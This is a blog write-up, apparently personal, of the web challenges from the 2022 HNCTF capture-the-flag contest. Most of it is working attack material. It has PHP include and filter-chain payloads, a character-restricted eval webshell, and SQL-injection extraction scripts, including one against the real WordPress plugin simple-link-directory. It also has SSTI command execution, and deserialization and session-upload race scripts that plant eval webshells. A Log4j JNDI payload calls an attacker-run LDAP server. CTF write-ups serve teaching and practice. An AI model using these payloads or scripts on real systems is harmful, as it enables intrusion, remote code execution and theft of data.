---
title: "2022 HNCTF Web Writeup"
date: 2022-10-29T9:20:40+08:00
lastmod: 2022-10-29T9:20:40+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

题目还行

<!--more-->

## Week1

### Interesting_http

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051900856.png)

### 2048

/2048.js

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051902942.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051902896.png)

### easy_html

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051903086.png)

### Interesting_include

```php
<?php
//WEB手要懂得搜索
//flag in ./flag.php

if(isset($_GET['filter'])){
    $file = $_GET['filter'];
    if(!preg_match("/flag/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

```
http://43.143.7.97:28302/?filter=php://filter/read=convert.base64-encode/resource=flag.php
```

### easy_upload

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051905579.png)

### What is Web

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051906472.png)

### Challenge__rce

```php
<?php
error_reporting(0);
if (isset($_GET['hint'])) {
    highlight_file(__FILE__);
}
if (isset($_POST['rce'])) {
    $rce = $_POST['rce'];
    if (strlen($rce) <= 120) {
        if (is_string($rce)) {
            if (!preg_match("/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\\\\]/", $rce)) {
                eval($rce);
            } else {
                echo("Are you hack me?");
            }
        } else {
            echo "I want string!";
        }
    } else {
        echo "too long!";
    }
}
```

这题卡了好久, 过滤挺变态的

只能用 `$ _ () [] {} , . = + ;` 和数字 0-9 以及其它非 A-Z a-iz 的 Unicode 字符

开始用的是p牛文章里面的自增来构造 `_GET`, 结果超出了长度限制

然后根据题目的 hint `灵感来源于 ctfshow 七夕杯的 shellme_revenge`, 那题用的是 `NAN INF` 两个常量, 不过需要 `/` 运算符参与

想了好久... 再看文章的时候发现评论区底下有人用 chr 来构造 webshell

因为之前构造的是 `_GET`, 字母顺序是 E G T, 这就导致最后拼接起来很麻烦

但是 `chr` 的字母顺序就是 c h r, 可以通过 `Array` 中的 a 自增到 c 和 h

而且最关键的是字母 r 也在 `Array` 里, 可以直接取, 不需要自增, 这样就省了一大堆代码

最终 payload 如下

```php
$_=([].¥){3};$_++;$_.=++$_;$_++;$_++;$_++; $_++;$_++;$_.=([].¥){2};$_=_.$_(71).$_(69).$_(84);($$_{0})($$_{1});
```

长度为 112 字符

里面用到了一点 php7 的性质, 例如 `($a){1}` 和 `($a)($b)`, 然后又通过 `++$a` 和 `$a++` 的执行顺序差异进一步缩短长度

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210061511373.png)

## Week2

### easy_include

```php
<?php
//WEB手要懂得搜索

if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

nginx 日志包含

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051910358.png)

### ez_ssrf

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];

$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) {
    die();
}
else {
    fwrite($fp,$data);
    while(!feof($data))
    {
        echo fgets($fp,128);
    }
    fclose($fp);
}
```

fsockopen 发送原始 tcp 数据包

flag.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051911698.png)

手写一个 http 数据包

```
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: close

```

```
index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo%3d
```

请求的时候会卡很久才出结果, 不知道什么原因...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051914844.png)

### Canyource

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['code'])&&!preg_match('/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['code'])){
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);}
else
    die('nonono');}
else
    echo('please input code');
?>
```

这个正则一看就是无参数 rce

```
http://43.143.7.97:28972/?code=readfile(next(array_reverse(scandir(getcwd()))));
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051916825.png)


### easy_unser

```php
<?php 
    include 'f14g.php';
    error_reporting(0);

    highlight_file(__FILE__);

    class body{

    private $want,$todonothing = "i can't get you want,But you can tell me before I wake up and change my mind";

    public function  __construct($want){
        $About_me = "When the object is created,I will be called";
        if($want !== " ") $this->want = $want;
        else $this->want = $this->todonothing;
    }
    function __wakeup(){
        $About_me = "When the object is unserialized,I will be called";
        $but = "I can CHANGE you";
        $this-> want = $but;
        echo "C1ybaby!";
        
    }
    function __destruct(){
        $About_me = "I'm the final function,when the object is destroyed,I will be called";
        echo "So,let me see if you can get what you want\n";
        if($this->todonothing === $this->want)
            die("鲍勃,别傻愣着!\n");
        if($this->want == "I can CHANGE you")
            die("You are not you....");
        if($this->want == "f14g.php" OR is_file($this->want)){
            die("You want my heart?No way!\n");
        }else{
            echo "You got it!";
            highlight_file($this->want);
            }
    }
}

    class unserializeorder{
        public $CORE = "人类最大的敌人,就是无序. Yahi param vaastavikta hai!<BR>";
        function __sleep(){
            $About_me = "When the object is serialized,I will be called";
            echo "We Come To HNCTF,Enjoy the ser14l1zti0n <BR>";
        }
        function __toString(){
            $About_me = "When the object is used as a string,I will be called";
            return $this->CORE;
        }
    }
    
    $obj = new unserializeorder();
    echo $obj;
    $obj = serialize($obj);
    

    if (isset($_GET['ywant']))
    {
        $ywant = @unserialize(@$_GET['ywant']);
        echo $ywant;
    }
?>
```

乱七八糟的...

简单反序列化

用 unserializeorder 可以绕过 `is_file` 的检测

```php
<?php 

class body{

    private $want;

    function __construct($want){
        $this->want = $want;
    }
}

class unserializeorder{
    public $CORE = "php://filter/read=convert.base64-encode/resource=f14g.php";
}

$a = new body(new unserializeorder());

echo urlencode(serialize($a));
?>
```

```
http://43.143.7.97:28005/?ywant=O%3A4%3A%22body%22%3A2%3A%7Bs%3A10%3A%22%00body%00want%22%3BO%3A16%3A%22unserializeorder%22%3A1%3A%7Bs%3A4%3A%22CORE%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Df14g.php%22%3B%7D%7D
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051918643.png)

### easy_sql

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051948852.png)

过滤了 and information_schema 空格

information_schema 可以用 InnoDB 的表代替, 刚好数据库用户是 root, 版本号也满足

注释也被过滤了, 需要用 or 构造一下

然后就是利用子查询进行无列名盲注, 因为 InnoDB 的表查不了列名

```python
import requests

url = 'http://43.143.7.97:28635/index.php'

flag = ''

for i in range(9999):
    for s in range(32,128):
        #sql = "123'or(if(ascii(substr((select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats),{},1))={},1,0))or'1'='11".format(i,s)
        #sql = "123'or(if(ascii(substr((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='ctftraining'),{},1))={},1,0))or'1'='11".format(i,s)
        sql = "123'or(if(ascii(substr((select/**/group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)x),{},1))={},1,0))or'1'='11".format(i,s)
        res = requests.post(url,data={'id':sql})
        if 'error' in res.text:
            print('filtered !!!')
            exit()
        if 'handsome' in res.text:
            flag += chr(s)
            print(flag)
            break
```

### ez_SSTI

简单 ssti

```
http://43.143.7.97:28254/?name={{config.__class__.__init__.__globals__['os']['popen']('cat flag').read()}}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210052001015.png)

### ohmywordpress

题目给出了网站源码和 dockerfile

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091616173.png)

一开始以为是在 wordpress 里面藏了个免杀的 webshell 需要自己找, 于是用 git diff 看了下和原版源码的差异, 但是并没有看出来什么, 估计是思路偏了

看源码的时候看到了 qwb

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091619684.png)

想起来之前强网杯也有一道 wordpress 的题, 遂去看了下 wp, 思路是 user-meta 插件目录遍历

那么这题应该也差不多, 因为 wordpress 本身的源码已经足够安全了, 它的安全问题主要就来源于第三方主题和插件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091623746.png)

一共两个插件, 第一个没搜出来什么, 反倒是第二个 simple-link-directory, 存在 sql 注入

[https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210](https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091628711.png)

poc 如下

```bash
curl 'http://example.com/wp-admin/admin-ajax.php' --data 'action=qcopd_upvote_action&post_id=(SELECT 3 FROM (SELECT SLEEP(5))enz)'
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091627936.png)

python 脚本

```python
import requests
import time

url = 'http://1.14.71.254:28504/wp-admin/admin-ajax.php'

dicts = r'NSSCTF{-abcdef0123456789}'

flag = ''

for i in range(1,99999):
    for s in dicts:
        payload = "(SELECT 3 FROM (SELECT if(ascii(substr((select group_concat(flag) from ctftraining.flag),{},1))={}, sleep(5),0))enz)".format(i,ord(s))
        start_time = time.time()
        print(s)
        res = requests.post(url,data={
            'action': 'qcopd_upvote_action',
            'post_id': payload
            })
        stop_time = time.time()
        if stop_time - start_time >= 5:
            flag += s
            print('FOUND!!!',flag)
            break
```

## Week3

### ez_phar

```php
<?php
show_source(__FILE__);
class Flag{
    public $code;
    public function __destruct(){
    // TODO: Implement __destruct() method.
        eval($this->code);
    }
}
$filename = $_GET['filename'];
file_exists($filename);
?>
```

简单 phar 反序列化

访问 upload.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210141953975.png)

```php
<?php

class Flag{
    public $code;
}

$a = new Flag();
$a->code = 'system($_GET[1]);';

$phar =new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("<?php XXX __HALT_COMPILER(); ?>");
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

上传后的文件在 /upload 目录下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210141954856.png)

### Fun_php

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include "k1y.php";
include "fl4g.php";
$week_1 = false;
$week_2 = false;

$getUserID = @$_GET['user']; 
$getpass = (int)@$_GET['pass']; 
$getmySaid = @$_GET['mySaid']; 
$getmyHeart = @$_GET['myHeart']; 

$data = @$_POST['data'];
$verify =@$_POST['verify'];
$want = @$_POST['want'];
$final = @$_POST['final'];

if("Welcom"==0&&"T0"==0&&"1he"==1&&"HNCTF2022"==0)
    echo "Welcom T0 1he HNCTF2022<BR>";

if("state_HNCTF2022" == 1) echo $hint;
    else echo "HINT? NoWay~!<BR>";


if(is_string($getUserID))
    $user = $user + $getUserID; //u5er_D0_n0t_b3g1n_with_4_numb3r

if($user == 114514 && $getpass == $pass){
    if (!ctype_alpha($getmySaid)) 
        die();
    if (!is_numeric($getmyHeart)) 
        die();
    if(md5($getmySaid) != md5($getmyHeart)){
        die("Cheater!");
    }
    else
        $week_1 = true;
}

if(is_array($data)){
    for($i=0;$i<count($data);$i++){

        if($data[$i]==="Probius") exit();

        $data[$i]=intval($data[$i]);
    }
    if(array_search("Probius",$data)===0)
        $week_2 = true;

    else
        die("HACK!");
}
if($week_1 && $week_2){
    if(md5($data)===md5($verify))
        if ("hn" == $_GET['hn'] && "ctf" == $_GET[ctf]) {

            if(preg_match("/php|\fl4g|\\$|'|\"/i",$want)Or is_file($want))
                die("HACK!");
       
                else{
                    echo "Fine!you win";
                    system("cat ./$want");
                 }
    }
    else
        die("HACK!");
}

?>
```

代码中有零宽字符, 贴的时候我删掉了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151134893.png)

前面的 hint 给的很明显了, 考察 php 弱类型中数字与字符串的比较

首先判断 `$user` 和 `$getpass` 的内容

这里的 `$user == 114514` 比较的时候会把 `$user` 转换成数字, 然后再进行比较

而且 `$user = $user + $getUserID` 用的是 `+` 而不是 `.`, 所以会有一个数字相加的问题

如果 `$user` 是以数字开头的话, 类型转换的结果就是 `0-9`, 如果是以字母开头的话, 转换的结果就是 `0`

`$getpass == $pass` 同理, 只需要带入 `0-9` 检验即可

用 burp intruder 跑一下, user 设置成 `114514-[0-9]`, pass 设置成 `0-9`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151142631.png)

刚开始做的时候跑出来 user 是 114513, 题目应该是又改了一下...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151143061.png)

后面就是常规的 md5 比较

然后 `array_search` 也会有类型转换的问题, 这里直接用 0, 因为 `Probius` 转换成 int 的结果是 0

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151145952.png)

最后传参 hn 和 ctf, 记得把零宽字符也复制下来

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151149877.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151149735.png)



### logjjjjlogjjjj

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151150622.png)

log4j 反序列化

[https://www.freebuf.com/vuls/309584.html](https://www.freebuf.com/vuls/309584.html)

[https://github.com/WhiteHSBG/JNDIExploit](https://github.com/WhiteHSBG/JNDIExploit)

直接用 payload 打就行

启动 ldap

```bash
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i x.x.x.x -p 65222
```

get 传参

```
payload=${jndi:ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho}
```

注意后面要 urlencode 一次

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151153455.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151154124.png)

查看 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151155984.png)

### ssssti

简单 ssti, 过滤了下划线, 单双引号

`request.args.a` 用不了, 过滤了 args 关键词, 但是 `request.values.a` 能用

```
http://43.143.7.127:28093/?name={{lipsum[request.values.a][request.values.b][request.values.c](request.values.d).popen(request.values.e).read()}}&a=__globals__&b=__builtins__&c=__import__&d=os&e=cat /flag
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171842317.png)

### QAQ_1inclu4e

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201133595.png)

开头有点谜语人, 猜了好久的参数, 最后试出来是 `QAQ`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201134761.png)

过滤了点号和 php 关键词

换个思路, 尝试 session 文件包含

```python
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://43.143.7.127:28077/index.php'
flag = 'xxxx'

def upload():
    files = [
        ('file', ('xx.txt', 'xxx')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': "<?php file_put_contents('/tmp/xzxzxz', '<?php eval($_REQUEST[1]);phpinfo();?>');?>"}

    while True:
        res = requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )
        print('upload',res.text)



def write():
    while True:
        response = requests.get(
            f'{target}?QAQ=/tmp/sess_{flag}',
        )
        print('write',response.text)
        if 'phpinfo' in response.text:
            print('success')

for i in range(10):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=write)
    t1.start()
    t2.start()
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201135601.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201136614.png)

flag 在 /var 目录下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201137228.png)

## Week4

### unf1ni3hed_web3he1

题目前面有点谜语人了...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251810968.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251810011.png)

给的 hint 提示要访问 `/t00llll.php` ...

```php
<?php
error_reporting(0);

if (!isset($_GET['include_'])) {
    echo "使用工具的时候,要轻一点哦~";
    show_source(__FILE__);
}else{
    $include_ = $_GET['include_'];
}
if (preg_match('/sess|tmp/i', $include_)) {
    die("可恶涅,同样的方法怎么可能骗到本小姐两次!");
}else if (preg_match('/sess|tmp|index|\~|\@|flag|g|\%|\^|\&|data|log/i', $include_)) {
    die("呜呜呜,不可以包含这些奇奇怪怪的东西欸!!");
}
else @include($include_);

?>
```

去包含原来的 webshell

```
http://43.143.7.127:28843/t00llll.php?include_=php://filter/read=convert.base64-encode/resource=Rea1web3he11.php
```

```php
<?php 
error_reporting(0);
ini_set('session.serialize_handler', 'php');
session_start();
echo "y0u_m4ybe_n3ed_s0me_t00llll_t0_u4_1t!"."<br>";

class webshell{
    public $caution;
    public $execution;

    function __construct(){
        $this -> caution = new caution();
    }

    function __destruct(){
        $this -> caution -> world_execute();
    }
    function exec(){
        @eval($execution);
    }
}
class caution{
    function world_execute(){
        echo "Webshell初&#%始*$%&^化,$))(&*(%#^**ERROR**#@$()"."<br>";
    }
}
class execution{
    public $cmd;
    function __construct(){
        $this -> cmd = 'echo "即将执行命令:".$cmd;';
    }
    function world_execute(){
        eval($this -> cmd);
    }
}
?>
```

很明显是 session 反序列化, payload 如下

```php
<?php
class webshell{
    public $caution;
}

class execution{
    public $cmd;
}

$b = new execution();
$b->cmd = 'system("ls -/");';

$a = new webshell();
$a->caution = $b;

echo '|'.serialize($a);
```

反序列化的时候需要利用到 session\_upload\_progress, 但是提交的时候发现并没有执行对应的命令

估计是 `session.upload_progress.cleanup` 被设置成了 `On`, session 清空导致来不及反序列化

解决方法就是利用条件竞争, 在 post 表单的同时携带相同 PHPSESSID 的 cookie 去访问这个 webshell

脚本如下

```python
import threading
import requests

url = 'http://43.143.7.127:28843/Rea1web3he11.php'
flag = 'aaa'

cmd = "system('cat /secret/flag');"

payload = r'|O:8:"webshell":1:{s:7:"caution";O:9:"execution":1:{s:3:"cmd";s:' + str(len(cmd)) + ':"' + cmd + '";}}'

def upload():
    files = [
        ('file', ('xx.txt', 'xxx'*10240)),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': payload}

    while True:
        res = requests.post(url, data=data, files=files, cookies={'PHPSESSID': flag})
        print('upload',res.text)

def write():
    while True:
        res = requests.get(url, cookies={'PHPSESSID': flag})
        print('write',res.text)

for i in range(10):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=write)
    t1.start()
    t2.start()
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251818510.png)

### pop子和pipi美

这题也挺谜语的... 先要传参番号才会显示源码

```
http://43.143.7.97:28778/?pop_EP=ep683045
```

```php
<?php
error_reporting(0);
//flag is in f14g.php
class Popuko {
    private $No_893;
    public function POP_TEAM_EPIC(){
        $WEBSITE  = "MANGA LIFE WIN";
    }
    public function __invoke(){
        $this->append($this->No_893);
    }
    public function append($anti_takeshobo){
        include($anti_takeshobo);
    }
}

class Pipimi{
    
    public $pipi;
    public function PIPIPMI(){
        $h = "超喜欢POP子ww,你也一样对吧(举刀)";
    }
    public function __construct(){
        echo "Pipi美永远不会生气ww";
        $this->pipi = array();
    }

    public function __get($corepop){
        $function = $this->p;
        return $function();
    }
}
class Goodsisters{

    public function PopukoPipimi(){
        $is = "Good sisters";
    }

    public $kiminonawa,$str;

    public function __construct($file='index.php'){
        $this->kiminonawa = $file;
        echo 'Welcome to HNCTF2022 ,';
        echo 'This is '.$this->kiminonawa."<br>";
    }
    public function __toString(){
        return $this->str->kiminonawa;
    }

    public function __wakeup(){
        if(preg_match("/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i", $this->kiminonawa)) {
            echo "仲良ピース!";
            $this->kiminonawa = "index.php";
        }
    }
}

if(isset($_GET['pop'])) @unserialize($_GET['pop']);  

else{
    $a=new Goodsisters;
    if(isset($_GET['pop_EP']) && $_GET['pop_EP'] == "ep683045"){
        highlight_file(__FILE__);
        echo '欸嘿,你也喜欢pop子~对吧ww';
    }
}
```

简单 pop 链构造

```php
<?php

class Popuko {
    public $No_893;
}

class Pipimi{
    public $pipi;
}

class Goodsisters{
    public $kiminonawa,$str;
}

$d = new Popuko();
$d->No_893 = 'php://filter/read=convert.base64-encode/resource=f14g.php';

$c = new Pipimi();
$c->p = $d;

$b = new Goodsisters();
$b->str = $c;

$a = new Goodsisters();
$a->kiminonawa = $b;

echo serialize($a);
```

### fun_sql

```php
<?
include "mysql.php";
include "flag.php";

if ( $_GET['uname'] != '' && isset($_GET['uname'])) {

    $uname=$_GET['uname'];

    if(preg_match("/regexp|left|extractvalue|floor|reverse|update|between|flag|=|>|<|and|\||right|substr|replace|char|&|\\\$|0x|sleep|\#/i",$uname)){
        die('hacker');
        
    }
    
    $sql="SELECT * FROM ccctttfff WHERE uname='$uname';";
    echo "$sql<br>";
    

    mysqli_multi_query($db, $sql);
    $result = mysqli_store_result($db);
    $row = mysqli_fetch_row($result);

    echo "<br>";

    echo "<br>";
    if (!$row) {
        die("something wrong");
    }
    else
    {
        print_r($row);
        echo $row['uname']."<br>";
        
    }
    if ($row[1] === $uname)
    {
    die($flag);
    }
}
highlight_file(__FILE__);
```

多句执行好像不能用, 只能 union 查询...

直接用 load_file() 读取 flag.php

```
http://43.142.108.3:28436/?uname=123' union select 1,load_file(concat('/var/www/html/fla','g.php')),3; --+
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251054165.png)
